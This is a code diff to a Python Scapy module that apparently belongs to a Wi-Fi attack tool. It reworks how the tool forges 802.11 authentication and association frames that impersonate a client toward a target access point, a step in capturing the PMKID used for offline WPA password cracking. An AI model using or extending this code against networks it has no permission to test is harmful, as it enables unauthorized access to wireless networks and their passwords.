@@ -27,6 +27,10 @@ from scapy.layers.dot11 import Dot11AssoReq
 from scapy.layers.dot11 import Dot11AssoResp
 from scapy.layers.dot11 import Dot11EltRates
 from scapy.layers.dot11 import RadioTapExtendedPresenceMask
+from scapy.layers.dot11 import Dot11EltCountryConstraintTriplet
+from scapy.layers.dot11 import RSNCipherSuite
+from scapy.layers.dot11 import AKMSuite
+from scapy.layers.dot11 import Dot11EltVendorSpecific
 from scapy.layers.eap   import EAPOL
 
 pull = PULL()
@@ -38,6 +42,8 @@ class PMKID:
 
 	__ASSORUNNER = True
 	__ASSOSTATUS = True
+
+	__EAPOSTATUS = True
 
 	def __init__(self, iface, bssid, essid, channel, power, device, encryption, cipher, auth, beacon, stations, outfname, pauth, passo, dauth, dasso):
 		self.interface  = iface
@@ -104,57 +110,23 @@ class PMKID:
 		return pkt
 
 	def forge_asso_frame(self, ap, cl):
-		def enum(pkt):
-			elts = pkt.getlayer(Dot11Elt)
-			retval, count = {}, 0
-
-			try:
-				while isinstance(elts[count], Dot11Elt):
-					if hasattr(elts[count], "ID"):
-						if elts[count].ID == 0 or elts[count].ID == 1 or elts[count].ID == 50 or elts[count].ID == 48 or elts[count].ID == 45 or elts[count].ID == 127 or elts[count].ID == 59 or elts[count].ID == 221:
-							retval[ elts[count].ID ] = elts[count]
-					count += 1
-			except IndexError:
-				pass
-
-			return retval
-
-		def form(efields, layer):
-			print(efields)
-			for key in list(efields.items()):
-				if key == 0 or key == 1 or key == 50 or key == 48 or key == 45 or key == 127 or key == 59 or key == 221:
-					layer /= efields.get(key)
-			
-			return layer
-
 		capibility = self.beacon.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}")
-		pkt        = RadioTap(
-							version=0,
-							pad=0,
-							present="Flags+Rate+Channel+dBm_AntSignal+Antenna+RXFlags",
-							Rate=2,
-							Flags="",
-							dBm_AntSignal=-30,
-							Antenna=1,
-							RXFlags="",
-							notdecoded=''
-						) / Dot11(
-							subtype=0,
+
+		forger = self.beacon
+		payload = forger.getlayer(3).payload
+		forger.getlayer(1).remove_payload()
+		#payload.getlayer(1).remove_payload()
+
+		pkt = RadioTap() / Dot11(
+							subtype=3,
 							type=0,
-							proto=0,
-							FCfield="",
-							ID=14849,
-							SC=608,
 							addr1=ap,
 							addr2=cl,
-							addr3=ap
-						) / Dot11AssoReq(
-							cap="short-slot+ESS+privacy+short-preamble",
-							listen_interval=10
-						)
+							addr3=ap,
+						) / Dot11AssoReq(cap="short-slot+res12+ESS+privacy+short-preamble", listen_interval=3) / payload
 
-		efields    = enum(self.beacon)
-		pkt        = form(efields, pkt)
+		pkt.show()
+
 		return pkt
 
 	def auth_sender(self, pkt):
@@ -190,7 +162,7 @@ class PMKID:
 			sn     = retval[0]
 			rc     = retval[1]
 
-			if sn == self.bssid and rc == self.myaddress:
+			if sn == self.bssid and rc == self.myaddress and pkt.getlayer(Dot11Auth).seqnum == 2 and pkt.getlayer(Dot11Auth).status == 0:
 				pull.print(
 					"$",
 					"Authentication Res. [{status}] ({apvendor}) {ap} <--> ({stavendor}) {sta} ({essid})".format(
@@ -242,7 +214,7 @@ class PMKID:
 			if sn == self.bssid and rc == self.myaddress:
 				pull.print(
 					"$",
-					"Authentication Res. [{status}] ({apvendor}) {ap} <--> ({stavendor}) {sta} ({essid})".format(
+					"Association Res. [{status}] ({apvendor}) {ap} <--> ({stavendor}) {sta} ({essid})".format(
 						status=pull.GREEN+"Confirmed!"+pull.END,
 						apvendor=pull.DARKCYAN+pull.get_mac(self.bssid)+pull.END,
 						ap=self.bssid.upper(),
@@ -253,6 +225,7 @@ class PMKID:
 					"\r",
 					pull.GREEN
 				)
+
 				raise KeyboardInterrupt()
 
 	def engage(self):
@@ -267,8 +240,8 @@ class PMKID:
 		sniff(iface=self.interface, prn=self.auth_receiver)
 
 		self.__AUTHRUNNER = False
-		while self.__AUTHSTATUS:
-			pass
+		#while self.__AUTHSTATUS:
+		#	pass
 
 		t = threading.Thread(target=self.asso_sender, args=(asso_frame,))
 		t.daemon = True
